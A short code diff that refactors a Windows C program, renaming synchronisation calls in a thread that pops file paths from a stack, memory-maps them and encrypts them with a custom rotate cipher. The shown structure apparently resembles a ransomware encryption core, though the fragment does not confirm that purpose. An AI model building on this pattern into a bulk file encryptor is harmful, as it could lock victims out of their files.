@@ -2,8 +2,10 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <windows.h>
+#include "file_utils.h"
 #include "encrypt.h"
 #include "stack.h"
+#include "sync.h"
 
 static inline void lr13(uint64_t *data) {
     *data = (*data << 13) | (*data >> (64 - 13));
@@ -53,10 +55,10 @@ void encrypt_data(LPCVOID p_src, LPVOID p_dest, DWORD file_size) {
 DWORD WINAPI pop_and_encrypt(LPVOID param) {
     struct Stack *stack = (struct Stack*)param;
     while(true) {    
-        wait_sem();
-        lock_mutex();
+        sync_wait_semaphore();
+        sync_lock_mutex();
         wchar_t *file_path = (wchar_t*)stack_pop(stack);
-        unlock_mutex();
+        sync_unlock_mutex();
         LPVOID p_src, p_dst;
         DWORD file_size;
         create_file_mappings(file_path, &file_size, &p_src, &p_dst);
